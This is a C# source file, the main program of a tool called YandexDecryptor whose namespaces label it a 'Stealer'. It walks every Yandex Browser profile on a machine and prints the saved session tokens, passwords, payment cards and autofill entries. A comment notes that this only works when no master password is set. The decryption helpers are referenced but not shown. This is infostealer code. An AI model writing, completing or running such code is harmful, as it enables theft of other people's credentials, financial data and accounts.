using System;
using static YandexDecryptor.Helpers.Models;
using YandexDecryptor.Stealer.Browsers.Yandex;

namespace YandexDecryptor
{
    internal sealed class Program
    {
        private static readonly IBrowser[] Browsers = new IBrowser[]
        {
            new Yandex("%LocalAppData%\\Yandex\\YandexBrowser"),
        };

        // Decryption supported only if master password not set!

        public static void Main(string[] args)
        {
            foreach (IBrowser browser in Browsers)
            {
                if (browser.Exists())
                {
                    foreach (BrowserProfile profile in browser.GetProfiles())
                    {
                        string simpleName = string.Format(browser.GetName() + "_" + profile.InternalName);
                        Console.WriteLine($" --- {simpleName} --- ");
                        Console.WriteLine(IterateStructure(browser.GetTokens(profile)));
                        Console.WriteLine(IterateStructure(browser.GetPasswords(profile)));
                        Console.WriteLine(IterateStructure(browser.GetCards(profile)));
                        Console.WriteLine(IterateStructure(browser.GetAutoFills(profile)));


                    }
                }
            }
        }

    }
}
